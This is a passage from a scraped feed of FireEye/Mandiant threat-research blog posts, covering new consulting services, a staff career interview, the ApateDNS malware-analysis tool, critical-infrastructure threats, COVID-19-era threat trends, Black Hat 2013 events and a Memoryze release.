useful data points for more thorough analysis.</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 30 Apr 2013 19:52:04 +0000","feedId":1226,"bgimg":"","linkMd5":"5770af26461bcf0087fcc7a491a5aa68","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264209},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"New Tactics. New Motives. New Services.","link":"http://www.fireeye.com/blog/threat-research/2014/10/tactics-motives-services.html","description":"<div class=\"c00 c00v1\"> \n <p>Every day at <a href=\"http://www.mandiant.com/\" target=\"_blank\">Mandiant</a> we respond to some of the largest cyber security incidents around the world. This gives us a front-row seat to witness what works (and what doesn't) when it comes to finding attackers and preventing them from stealing our clients' data.</p> \n <p>Attackers' tactics and motives are evolving and as a result our security strategies also need to adapt. Today, <a href=\"http://www.fireeye.com/news-events/press-releases/read/fireeye-offers-new-mandiant-consulting-services-to-address-evolving-motives-and-tactics-of-advanced-threat-actors\" target=\"_blank\">we announced two new service offerings</a> that will further help our clients improve their protective, detective, and responsive security controls and leverage Mandiant's extensive experience responding to some of the most serious cyber security incidents.</p> \n <p>Our first new service offering addresses attackers' expanding motives. We are starting to see attackers with destructive motives and what could be more damaging than attacking a nation's critical infrastructure. Security incidents at critical infrastructure such as electric power grids, utilities and manufacturing companies can affect the lives of hundreds of thousands of people. Our new <a href=\"https://www.fireeye.com/content/fireeye-www/global/en/www/services/mandiant-industrial-control-system-gap-assessment.html\" target=\"_blank\">Industrial Control Systems (ICS) Security Gap Assessment</a> is specifically focused on helping these industries - and others that use SCADA systems - to assess their existing security processes for industrial control systems. The service helps identify security GAPs and provides specific recommendations to close those GAPs and safeguard critical infrastructure.</p> \n <p>Our second new service offering is designed to help organizations address the challenges they face as they build out their own internal security operations program and incident response teams. Many organizations want to enhance their internal capabilities beyond the traditional security operations centers (SOCs). Our new <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/cyber-defense-center-development.html\" target=\"_blank\">Cyber Defense Center Development</a> service helps organizations evolve their internal SOC by improving the visibility (monitoring and detection) and response capabilities (incident response) necessary to defend against advanced threats. This service looks at existing people, process, and technologies and identifies areas for improvement. It helps companies to identify and prioritize the alerts that require the most immediate action with the goal to reduce the mean time to remediation.</p> \n <p>If either of these new services sound like something that could help your organization <a href=\"http://www.mandiant.com/contact/\" target=\"_blank\">let us know</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Wed, 08 Oct 2014 19:16:51 +0000","feedId":1226,"bgimg":"","linkMd5":"528066580a77692e072ae5e0a18ac4e0","bgimgJsdelivr":"","metaImg":"","author":"Jurgen Kutscher","publishedOrCreatedDate":1598278264200},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Career Paths in Cybersecurity Interview Series: Jed Mitten, Principal Consultant","link":"http://www.fireeye.com/blog/threat-research/2012/12/career-paths-cybersecurity-interview-series-br-jed-mitten.html","description":"<div class=\"c00 c00v1\"> \n <p> <i>Recently, I caught-up with M-Unition bloggers Willi Ballenthin and Jed Mitten to discuss their career paths in cybersecurity. Today's blog post focuses on Jed, a principal consultant who has been with Mandiant over five years.</i></p> \n <p> <b>Helena Brito: Jed, how did you get interested in cybersecurity?</b></p> \n <p> <b>Jed Mitten:</b> Well, when I was an undergrad my focus was on computer science: programming, data structure and algorithm analysis. The idea of virus detection was still really hot back at the time and developing heuristics sounded very cool to me. While I was working on my Bachelor's Degree I got interested in learning more about cybersecurity, so I took a class specifically on it and found it to be quite interesting. It also helped that a pretty great instructor was running the class. So that was my first taste of actual information security and, after I graduated, I wrote personnel management applications for two years in the government sector.</p> \n <p>Halfway through that second year of programming, I realized I was not following my passion. I researched some graduate programs and found the <a href=\"http://www.ini.cmu.edu/\">Information Networking Institute at Carnegie Mellon University</a> best fit my interests. Near the end of my time at CMU, I was approached by an alumnus of the INI who had begun working at Mandiant. I found the company to be a good fit for me and decided to join. I've been with Mandiant ever since.</p> \n <p> <b>Helena Brito: At Mandiant you're well-known for creating one of our most popular tools, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/highlighter.html\">Highlighter</a>™. Do you want to give some background on Highlighter and tell our readers what inspired you and Jason Luttgens (co-creator of the tool) to make this freeware tool?</b></p> \n <p> <b>Jed Mitten: </b>Well, I had the good fortune of sitting in the same cubicle as Jason when Mandiant moved into its first office in Alexandria, VA. One day, Jason was doing some of his magic and came across a problem of getting rid of data in log files that he knew was good. He didn't want it to bog him down visually while looking for stuff. Literally the next day Jason wrote a program called \"Get Out of My Face.\" He showed it to me and we discussed what else could be done with the tool, such as statistics. So we hashed it around a little bit and gave the tool to some of our consultant buddies in the company, and a few external to Mandiant.</p> \n <p>Through that process we got some pretty amazing feedback that eventually created the first iteration of Highlighter. The tool has been improving slowly but surely as the Highlighter community - a larger community now - uses it and asks for specific requests.</p> \n <p> <b>Helena Brito: I see that you are a member of the M-Unition blog team. Do you have any upcoming posts that you'd like to talk about or any ideas for posts that you want to write in 2013?</b></p> \n <p> <b>Jed Mitten:</b> Recently, I reached-out to some Highlighter super users and created a series based on interviews with those users. The <a href=\"https://blog.mandiant.com/archives/3789\">first post</a> from that series just went up. Generally, I'd like to do some more posts on Highlighter; tips and tricks on some features that aren't currently used as much as more well-known features. I don't get much time for research in my daily life, but when I do I'll share it.</p> \n <p> <b>Helena Brito: You moved out to San Diego, California about a year-and-a-half ago. In that time, what have you done to get involved with the local tech communities out there?</b></p> \n <p> <b>Jed Mitten:</b> Luckily, there's a lot of tech in San Diego, specifically biotech and military. Because of this I've had an opportunity to connect with some of the locals that may not do the same work I do, but work in the same security space. Whether they're developers, forensic analysts or on the penetration testing side, we all learn from one another.</p> \n <p>I've joined local chapters of professional organizations such as <a target=\"_blank\" href=\"http://www.htcia.org/\">HTCIA </a>(High-Tech Crime Association) and <a target=\"_blank\" href=\"http://www.issa.org/\">ISSA</a>. I hope to check out the B-Sides in Los Angeles and maybe head up to Silicon Valley once in a while to check-out the industry in that area.</p> \n <p> <b>Helena Brito: Is there any advice you'd like to give to people who are just getting out of school and are interested in a career in cybersecurity?</b></p> \n <p> <b>Jed Mitten:</b> I've been asked this question a few times in my life and I sort of see three paths to get to where I am or to get to a similar, perhaps lateral, place to where I am. The first path is through the military. I know some really excellent, super-technically-savvy, creative people that came out of the military. I only met them at Mandiant, and it was kind of an eye-opener because I got to see firsthand the quality experience the military can offer people in infosec.</p> \n <p>The second path is formal education, which was my personal path. I went to college, started at a two-year university and moved to a four-year and then went on to grad school. The education path allowed me to choose my own adventure to get to where I wanted to go. However, it's important to note that I had a clear vision for what I wanted and that helped keep me focused. Having a clear vision for your career is very important, I believe. No matter where you start, having a clear vision of where you want to end up will keep you on the right track.</p> \n <p>The third path is for those who are just so interested in the topic of security that they follow their passion. They may have formal education, but it may not be in the career that they've chosen within security, so they get active in the community and push themselves into what they want to focus on. Having a mentor to look up to with this path is crucial as they can guide you and offer support.</p> \n <p> <b>Helena Brito: Thank you Jed for discussing your career path in cybersecurity. I know our readers will learn a lot from your personal experience as an infosec professional.</b></p> \n</div>","descriptionType":"html","publishedDate":"Thu, 06 Dec 2012 23:55:53 +0000","feedId":1226,"bgimg":"","linkMd5":"025529c169fd1fa71d6fb3b7c6cf5a06","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264211},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Research Tool Release: ApateDNS","link":"http://www.fireeye.com/blog/threat-research/2011/10/research-tool-release-apatedns.html","description":"<div class=\"c00 c00v1\"> \n <p>Here at Mandiant we deal with our fair share of malicious code. Being able to quickly identify specific information about a piece of malware is imperative. More specifically, knowing which domains a piece of malware uses for command and control (C2) communication is important to on-site incident responders.</p> \n <p>To aid analysts in DNS identification, I have written <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/apatedns.html\">ApateDNS</a>. It is a simple tool that acts as a phony DNS server that can log or manipulate DNS requests being made to it. Malware analysts typically use this to redirect beacon traffic from a guest virtual machine to the host system (or another virtual machine) to monitor beacon and/or communication channels using Netcat or a custom written C2 script. Forensic analysts typically use this tool to quickly extract DNS names from malware samples.</p> \n <p>ApateDNS automatically sets up your Windows network configurations by attempting to determine the default route or current DNS settings. This is most useful when in a guest virtual machine since the default route is typically the host machine. As shown in the figure below, ApateDNS has found the default route in my virtual machine (192.168.239.1) and uses this IP address for any DNS request on my virtual host. The user may override this by specifying an IP address for DNS Reply IP.</p> \n <p>Malware often uses multiple C2 domains. To catch this, ApateDNS allows a user to specify a number of non-existent DNS (NXDOMAIN) replies for any possible DNS lookup. As seen in the figure below, the malware returns a single, non-existent domain for each DNS request (since a \"1\" is entered for \"# of NXDOMAIN's\"). The example malware beacons and detects if a valid IP address has been resolved from a DNS request, if not, it will continue to walk down its C2 domain list. By using the NXDOMAIN functionality, we see three different DNS requests made by the malware: evil1.example.com, evil2.example.com and evil3.example.com.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/ApateDNS.jpg\"><img width=\"300\" height=\"216\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/ApateDNS-300x216.jpg\" title=\"ApateDNS\" class=\"aligncenter size-medium wp-image-1966\" /></a></p> \n <p>ApateDNS gives malware analysts an easy way to control DNS on their machine and forensic analysts a way to monitor DNS requests made by malware. Of course, not all malware utilizes DNS and some may not beacon without a specific set of conditions being satisfied. ApateDNS's use cases are not limited just to malware. It can be used for any purpose where a user may want to monitor outbound DNS requests or traffic.</p> \n <p>Feel free to check out ApateDNS <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/apatedns.html\">here</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 24 Oct 2011 20:27:21 +0000","feedId":1226,"bgimg":"","linkMd5":"ecf7b4dc53a41cb091e3746046c0746e","bgimgJsdelivr":"","metaImg":"","author":"Steve Davis","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/ApateDNS-300x216.jpg":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn10@2020_6/2020/08/24/14-11-14-251_a58f87cbcb21de82.webp"},"publishedOrCreatedDate":1598278264214},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Critical Infrastructure Beyond the Power Grid","link":"http://www.fireeye.com/blog/threat-research/2013/11/critical-infrastructure-power-grid.html","description":"<div class=\"c00 c00v1\"> \n <p>The term \"critical infrastructure\" has earned its spot on the board of our ongoing game of cyber bingo--right next to \"Digital Pearl Harbor,\" \"Cyber 9/11,\" \"SCADA\" and \"Stuxnet.\"</p> \n <p>With \"critical infrastructure\" thrown about in references to cyber threats nearly every week, we thought it was time for a closer look at just what the term means-and what it means to other cyber threat actors.</p> \n <p>The term \"<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">critical infrastructure</a>\" conjures up images of highways, electrical grids, pipelines, government facilities and utilities. But the U.S. government definition also includes economic security and public health. The Department of Homeland Security defines critical infrastructure as <i>\"Systems and assets, whether physical or virtual, so vital to the United States that the incapacity or destruction of such systems and assets would have a debilitating impact on security, national economic security, national public health or safety, or any combination of those matters.\"<a href=\"http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf\" target=\"_blank\">[1]</a></i></p> \n <p>Certainly the U.S. definition is expansive, but some key cyber actors go a step further to include a more abstract \"information<i>\" </i>asset. Russian officials view information content, flow and influencers as an enormous component of critical infrastructure. Iran and China similarly privilege the security of their information assets in order to protect their governments.</p> \n <p> <b>The bottom line?</b></p> \n <p>U.S. companies, who may have never considered themselves a plausible target for cyber threats, could become victims of offensive or defensive state cyber operations. Earlier this year several media outlets-including the New York Times and Washington Post-disclosed that they had been the victims of China-based intrusions. The Times and the Post linked the intrusions on their networks to their reporting on corruption in the upper echelons of the Chinese Communist Party and other issues.</p> \n <p>These media outlets weren't sitting on plans for a new fighter jet or cutting edge wind turbines-information often assumed to be at risk for data theft. Rather, the reporters at the Times and Post were perched in key positions to influence U.S. government and public views of the Chinese leadership, possibly in a negative light. The Chinese government had conducted these intrusions against what it deemed critical infrastructure that supported the flow of valuable information.</p> \n <p> <b>Who's up next?</b></p> \n <p>State actors motivated to target critical infrastructure (by their own definition or the U.S.') won't just be the usual attention grabbers in cyberspace. We estimate that Iran, Syria, and North Korea all have interest and would be able to conduct or direct some level of network operations. These states are also likely to conduct operations in the near term to identify red lines and gauge corporate and government reactions. With little reputational loss at stake, we expect actors sponsored by or associated with these states to target an array of critical infrastructure targets. Companies who serve as key information brokers-for the public or the U.S. government-should be particularly attuned to the criticality their work is assigned by a variety of cyber threat actors.</p> \n <p>&nbsp;</p> \n <hr /> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <div> \n  <p>&nbsp;</p> \n  <p> <a href=\"http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf\" target=\"_blank\">http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf</a></p> \n  <p>&nbsp;</p> \n </div> \n <p>&nbsp;</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 19 Nov 2013 21:26:40 +0000","feedId":1226,"bgimg":"","linkMd5":"d6729dc106d812effb8bb9d381574e52","bgimgJsdelivr":"","metaImg":"","author":"Intel Team","publishedOrCreatedDate":1598278264206},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Limited Shifts in the Cyber Threat Landscape Driven by COVID-19","link":"http://www.fireeye.com/blog/threat-research/2020/04/limited-shifts-in-cyber-threat-landscape-driven-by-covid-19.html","description":"<p>Though COVID-19 has had enormous effects on our society and economy, its effects on the cyber threat landscape remain limited. For the most part, the same actors we have always tracked are behaving in the same manner they did prior to the crisis. There are some new challenges, but they are perceptible, and we—and our customers—are prepared to continue this fight through this period of unprecedented change.</p> \n<p>The significant shifts in the threat landscape we are currently tracking include:</p> \n<ul> \n <li>The sudden major increase in a remote workforce has changed the nature and vulnerability of enterprise networks.</li> \n <li>Threat actors are now leveraging COVID-19 and related topics in social engineering ploys.</li> \n <li>We anticipate increased collection by cyber espionage actors seeking to gather intelligence on the crisis.</li> \n <li>Healthcare operations,&nbsp;related manufacturing, logistics, and administration organizations, as well as government offices involved in responding to the crisis&nbsp;are increasingly critical and vulnerable to disruptive attacks such as ransomware.</li> \n <li>Information operations actors have seized on the crisis to promote narratives primarily to domestic or near-abroad audiences.</li> \n</ul> \n<h4>Same Actors, New Content</h4> \n<p>The same threat actors and malware families that we observed prior to the crisis are largely pursuing the same objectives as before the crisis, using many of the same tools. They are simply now leveraging the crisis as a means of social engineering. This pattern of behavior is familiar. Threat actors have always capitalized on major events and crises to entice users. Many of the actors who are now using this approach have been tracked for years.</p> \n<p>Ultimately, COVID-19 is being adopted broadly in social engineering approaches because it is has widespread, generic appeal, and there is a genuine thirst for information on the subject that encourages users to take actions when they might otherwise have been circumspect. We have seen it used by several cyber criminal and cyber espionage actors, and in underground communities some actors have created tools to enable effective social engineering exploiting the coronavirus pandemic. Nonetheless, COVID-19 content is still only used in two percent of malicious emails.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/limitedshifts/Picture1.png\" alt=\"\" />&nbsp;</p> \n<p>For the time being, we do not believe this social engineering will be abetting. In fact, it is likely to take many forms as changes in policy, economics, and other unforeseen consequences manifest. Recently we predicted a <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2020/03/stimulus-bill-social-engineering-covid-19-financial-compensation-schemes.html\">spike in stimulus related social engineering</a>, for example. Additionally, the FBI has recently released a <a href=\"https://www.fbi.gov/news/pressrel/press-releases/fbi-anticipates-rise-in-business-email-compromise-schemes-related-to-the-covid-19-pandemic\">press release</a> anticipating a rise in COVID-19 related Business Email Compromise (BEC) scams.</p> \n<h4>State Actors Likely Very Busy</h4> \n<p>Given that COVID-19 is the undoubtedly the overwhelming concern of governments worldwide for the time being, we anticipated targeting of government, healthcare, biotech, and other sectors by cyber espionage actors. We have not yet observed an incident of cyber espionage targeting COVID-19 related information; however, it is often difficult to determine what information these actors are targeting. There has been at least one case reported publicly which we have not independently confirmed.</p> \n<p>We have seen state actors, such as those from Russia, China and North Korea, leverage COVID-19 related social engineering, but given wide interest in that subject, that does not necessarily indicate targeting of COVID-19 related information.</p> \n<h4>Threat to Healthcare</h4> \n<p>Though we have no reason to believe there is a sudden, elevated threat to healthcare, the criticality of these systems has probably never been greater, and thus the risk to this sector will be elevated throughout this crisis. The threat of disruption is especially disconcerting as it could affect the ability of these organizations to provide safe and timely care. This threat extends beyond hospitals to pharmaceutical companies, as well as manufacturing, administration and logistics organizations providing vital support. Additionally, many critical public health resources lie at the state and local level.</p> \n<p>Though there is some anecdotal evidence suggesting some ransomware actors are avoiding healthcare targets, we do not expect that all actors will practice this restraint. Additionally, an attack on state and local governments, which have been a major target of ransomware actors, could have a disruptive effect on treatment and prevention efforts.</p> \n<h4>Remote Work</h4> \n<p>The sudden and unanticipated shift of many workers to work from home status will represent an opportunity for threat actors. Organizations will be challenged to move quickly to ensure sufficient capacity, as well as that security controls and policies are in place. Disruptive situations can reduce morale and increase stress, leading to adverse behavior such as decreasing users’ reticence to open suspicious messages, and even increasing the risk of insider threats. Distractions while working at home can cause lowered vigilance in scrutinizing and avoiding suspicious content as workers struggle to balance work and home responsibilities at the same time. Furthermore, the rapid adoption of platforms will undoubtedly lead to security mistakes and attract the attention of the threat actors.</p> \n<p>Secure remote access will likely rely on use of VPNs and user access permissions and authentication procedures intended to limit exposure of proprietary data. Hardware and infrastructure protection should include ensuring full disk encryption on enterprise devices, maintaining visibility on devices through an endpoint security tool, and maintaining regular software updates.&nbsp;</p> \n<p>For more on this issue, see our blog post on the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/executive-perspective/2020/03/remote-work-in-an-age-of-covid-19-threat-modeling-the-risks.html\">risks associated with remote connectivity</a>.</p> \n<h4>The Information Operations Threat</h4> \n<p>We have seen information operations actors promote narratives associated with COVID-19 to manipulate primarily domestic or near-abroad audiences. We observed accounts in Chinese-language networks operating in support of the People's Republic of China (PRC), some of which we previously identified to be promoting messaging pertaining to the Hong Kong protests, shift their focus to praising the PRC's response to the COVID-19 outbreak, criticizing the response of Hong Kong medical workers and the U.S. to the pandemic, and covertly promoting a conspiracy theory that the U.S. was responsible for the outbreak of the coronavirus in Wuhan.</p> \n<p>We have also identified multiple information operations promoting COVID-19-related narratives that were aimed at Russian- and Ukrainian-speaking audiences, including some that we assess with high confidence are part of the broader suspected Russian influence campaign publicly referred to as \"Secondary Infektion,\" as well as other suspected Russian activity. These operations have included leveraging a false hacktivist persona to spread the conspiracy theory that the U.S. developed the coronavirus in a weapons laboratory in Central Asia, taking advantage of physical protests in Ukraine to push the narrative that Ukrainians repatriated from Wuhan will infect the broader Ukrainian population, and claiming that the Ukrainian healthcare system is ill-equipped to deal with the pandemic. Other operations alleged that U.S. government or military personnel were responsible for outbreaks of the coronavirus in various countries including Lithuania and Ukraine, or insisted that U.S. personnel would contribute to the pandemic's spread if scheduled multilateral military exercises in the region were to continue as planned.</p> \n<h4>Outlook</h4> \n<p>It is clear that adversaries expect us to be distracted by these overwhelming events. The greatest cyber security challenge posed by COVID-19 may be our ability to stay focused on the threats that matter most. An honest assessment of the cyber security implications of the pandemic will be necessary to make efficient use of resources limited by the crisis itself.</p> \n<p> <i>For more information and resources that can help strengthen defenses, visit FireEye's \"<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/current-threats/covid-19.html\">Managing Through Change and Crisis</a>\" site, which aggregates many resources to help organizations that are trying to navigate COVID-19 related security challenges.</i></p>","descriptionType":"html","publishedDate":"Wed, 08 Apr 2020 16:15:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/limitedshifts/Picture1.png","linkMd5":"962933c7469bb4d3defef4f8379e9ad6","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn31@2020_3/2020/08/24/14-11-06-544_a7f32fce3e83ad65.webp","destWidth":974,"destHeight":893,"sourceBytes":170096,"destBytes":31196,"author":"Sandra Joyce","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/limitedshifts/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn31@2020_3/2020/08/24/14-11-06-544_a7f32fce3e83ad65.webp"},"publishedOrCreatedDate":1598278264183},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Mandiant @ Black Hat USA 2013","link":"http://www.fireeye.com/blog/threat-research/2013/07/mandiant-black-hat-usa-2013-2.html","description":"<div class=\"c00 c00v1\"> \n <p>In just a few short weeks we'll be boarding a flight to Las Vegas, NV for <a target=\"_blank\" href=\"http://www.blackhat.com/us-13/\">Black Hat USA 2013</a>. In addition to clothes and toiletries, I want to make sure you go to the annual conference with a <a target=\"_blank\" href=\"https://www.mandiant.com/events/event/black-hat-usa\">full list of Mandiant's activities at the show</a>.</p> \n <p> <u> <b>Black Hat Exhibitor Floor:</b></u></p> \n <ul> \n  <li>Visit Mandiant at booth #325</li> \n  <li>Pick-up a t-shirt and talk to some Mandiant folks</li> \n </ul> \n <p> <b>&nbsp;</b></p> \n <b> </b> \n <p> <b> <u>Reception:</u></b></p> \n <ul> \n  <li> <b>M After Dark</b> <br /> July 30, 2013<br /> 7:00 - 9:00 PM<br /> Shadow Bar, Caesars Palace<br /> Register to attend: <a target=\"_blank\" href=\"http://connect.mandiant.com/Mafterdark-BlackHat-2013\">http://connect.mandiant.com/Mafterdark-BlackHat-2013</a></li> \n </ul> \n <p> <a target=\"_blank\" href=\"http://connect.mandiant.com/Mafterdark-BlackHat-2013\"><b>Join</b></a> Mandiant for an unforgettable evening at the famed Shadow Bar, in Caesars Palace. The evening will showcase silhouetted performances by the shadow dancers, and libations will be served up by the venues world-class bartenders who are known to juggle bottles, toss limes, twirl glasses and even do back-flips.</p> \n <p> <u> <b>Books &amp; Beer Signing:</b></u></p> \n <ul> \n  <li> <b>Richard Bejtlich: \"The Practice of Network Security Monitoring\"</b> <br /> Wednesday, July 31<br /> 4:30 - 5:00 PM<br /> M Lair: Verona Room, The Promenade Level</li> \n </ul> \n <p>Book signing with <b>Richard Bejtlich</b> for his new release, \"The Practice of Network Security Monitoring\", and happy hour. The first five people in line for the book signing will win an invitation to a very special VIP dinner with Richard Bejtlich and Michael Sikorski, and will receive a free copy of their books. The first 30 people in line receive a FREE copy of Richard's book!</p> \n <ul> \n  <li> <b>Michael Sikorski: \"Practical Malware Analysis\"</b> <br /> Thursday, Aug 1<br /> 4:30 - 5:00 PM<br /> M Lair: Verona Room, The Promenade Level</li> \n </ul> \n <p>Book signing with <b>Michael Sikorski</b> for his 2012 release, \"Practical Malware Analysis\", and happy hour. The first 30 people in line receive a FREE copy of Michael's book!</p> \n <p> <u> <b>A Day in the Life Presentations</b></u></p> \n <ul> \n  <li> <b>Mandiant Labs (M-Labs)</b> <br /> Wednesday, July 31<br /> 12:45-1:30 PM</li> \n </ul> \n <p>Mandiant's Michael Sikorski and Stephen Davis will walk attendees through a typical day for a malware analyst and how they have successfully integrated machine learning into their research.</p> \n <ul> \n  <li> <b>Mandiant MCIRT Analysts</b> <br /> Thursday, August 1<br /> 12:45 - 1:30 PM</li> \n </ul> \n <p>Mandiant's James Condon and Mike Scutt will walk attendees through a typical day as an MCIRT Analyst, using an attack scenario to highlight the tools and processes used by MCIRT Analysts to successfully investigate a compromise.</p> \n <p> <u> <b>Arsenal:</b></u></p> \n <ul> \n  <li> <b>IOCWriter_11</b> <br /> <b>Presented by William (Will) Gibb</b> <br /> Thursday, August 1<br /> 10:00 AM - 12:30 PM<br /> Station 7</li> \n </ul> \n <p>With the impending release of the OpenIOC 1.1 format for sharing threat intelligence, Mandiant will be releasing a set of open source tools for creating and manipulating OpenIOC objects and moving data in and out of the OpenIOC format.</p> \n <p>Demonstrations will cover how the tools can be used to create and modify OpenIOC documents, show how it is possible to store Snort and Yara signatures in OpenIOC format and convert those OpenIOC documents back into their native formats. In addition, the integration of these tools into other open source applications will be demonstrated with tools that can automatically extract IOCs from unstructured content.</p> \n <ul> \n  <li> <b>Mandiant Redline™ </b> <br /> <b>Presented by Theodore (Ted) Wilson</b> <br /> Thursday, August 1<br /> 12:45 - 3:15 PM<br /> Station 7</li> \n </ul> \n <p> <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a>, Mandiant's premier free tool, provides host investigative capabilities to users to find signs of malicious activity through memory and file analysis, and the development of a threat assessment profile. With Redline, users can:</p> \n <p>- Thoroughly audit and collect all run processes, audit data, and memory images.</p> \n <p>- Analyze and view imported audit data, including narrowing and filtering results around a given timeframe using Redline's - Timeline functionality with the TimeWrinkle™ and TimeCrunch™ features.</p> \n <p>- Streamline memory analysis with a proven workflow for analyzing malware based on relative priority.</p> \n <p>- Identify processes more likely worth investigating based on the Redline Malware Risk Index (MRI) score.</p> \n <p>- Perform Indicator of Compromise (IOC) analysis. Supplied with a set of IOCs, the Redline Portable Agent is automatically configured to gather the data required to perform the IOC analysis and an IOC hit result review.</p> \n <ul> \n  <li> <b>OWASP Broken Web </b> <br /> <b>Presented by Chuck Willis</b> <br /> Thursday, August 1<br /> 12:45 - 3:15 PM<br /> Station 8</li> \n </ul> \n <p>The Open Web Application Security Project (OWASP) Broken Web Applications project (<a target=\"_blank\" href=\"http://www.owaspbwa.org\">www.owaspbwa.org</a>) provides a free and open source virtual machine loaded with web applications containing security vulnerabilities. This session will showcase the project VM and exhibit how it can be used for training, testing, and experimentation by people in a variety of roles.</p> \n <p>Demonstrations will cover how the project can be used by penetration testers who discover and exploit web application vulnerabilities, by developers and others who prevent and defend against web application attacks, and by individuals who respond to web application incidents. New features and applications in the recently released version 1.1 of the VM will also be highlighted.</p> \n <p>Let us know if you'll be at Black Hat USA 2013!</p> \n</div>","descriptionType":"html","publishedDate":"Wed, 17 Jul 2013 00:14:26 +0000","feedId":1226,"bgimg":"","linkMd5":"44f13f88a46d77ce8f9c33e6d1e41176","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264208},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"zynamics VxClass and memory analysis","link":"http://www.fireeye.com/blog/threat-research/2011/02/zynamics-memory-analysis.html","description":"<div class=\"c00 c00v1\"> \n <p>First, let me start by saying thanks to our users for the more than 10,000 unique downloads of Memoryze and Audit Viewer in 2010. Peter and I have been working with a lot of different people over the past couple of months to bring you this new release. You can download version 1.4.4200 of <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\">Memoryze</a> and <a target=\"_blank\" href=\"http://www.mandiant.com/products/free_software/mandiant_audit_viewer/\">Audit Viewer</a> now. I will just touch on a few things of most interest. You can read the User Guides for the rest.</p> \n <p> <b>zynamics VxClass Integration</b></p> \n <p>If you have not checked out <a target=\"_blank\" href=\"http://zynamics.com/vxclass.html\">VxClass</a> from zynamics, now is a good time. For those at MIRcon, you got to see Thomas Dullien's presentation. VxClass automatically classifies malware into families. This allows the incident responder to leverage intelligence from prior investigations and focus on the most important threats. Since it is fast and automated, VxClass is a great addition to your arsenal whether you have a malware team or not. VxClass can also generate private byte signatures (in ClamAV format) for a whole family of malware samples. Imagine finding 160 pieces of malware that VxClass automatically classifies as a single family and generates one byte pattern that you can use to find every variant. It is now possible, and you can take that byte signature and scan all the physical memory in your enterprise with <a target=\"_blank\" href=\"http://www.mandiant.com/products/core/intelligent_response\">MANDIANT Intelligent Response</a> or a host at a time with Memoryze and Audit Viewer.</p> \n <p>Thomas has a great write-up of how this process works <a target=\"_blank\" href=\"http://blog.zynamics.com/2011/01/27/memoryze-vxclass-vs-zeus/\">here</a>. I will not attempt to explain the article, but below is a glimpse.</p> \n <a href=\"http://blog.zynamics.com/2011/01/27/memoryze-vxclass-vs-zeus/\"><img width=\"417\" height=\"227\" title=\"Malware Overlap\" src=\"http://zynamics.files.wordpress.com/2011/01/tree-venn.png\" /></a>Two pieces of malware and how they overlap\n <p> <b>Report Generation</b></p> \n <p>Our users have really liked the wealth of information and the detailed analysis and scoring Memoryze and Audit Viewer provides, but sometimes you need all that data in a format you can rearrange. Audit Viewer has attempted to address this in different ways over time including the ability to cut-n-paste and comment almost every row of data. If you have not tried the comment feature, I encourage you to today. But how do you get all that information out of Audit Viewer as you work the incident? Well, Audit Viewer now includes the ability to automatically generate a report in text or Microsoft Word format with MRI results, case comments, handles, sections, ports, etc. Simply click on Operations-&gt;Generate Report.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/generate_report.jpg\"><img width=\"536\" height=\"349\" class=\"aligncenter size-full wp-image-1643\" title=\"Generate Report\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/generate_report.jpg\" /></a></p> \n <p>Here is a brief example of the lsass.exe process that was infected. <i>Note: if you are using this feature across every process with all the options turned on, it can generate large documents that Word and most editors may take a long time to process.</i></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/ir_report.jpg\"><img width=\"511\" height=\"516\" class=\"aligncenter size-full wp-image-1646\" title=\"Incident Response Report\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/ir_report.jpg\" /></a></p> \n <p> <b>Searching Process Address Space</b></p> \n <p>If you do not have access to zynamics VxClass, I encourage you pursue that; however, you can still search every process' address space. Memoryze will only return the processes that match your search criteria. Memoryze can also search for more than one pattern. It will look for the patterns and return the process if any pattern was a match. There are many applications of this technology. You could search for email addresses, partial domain 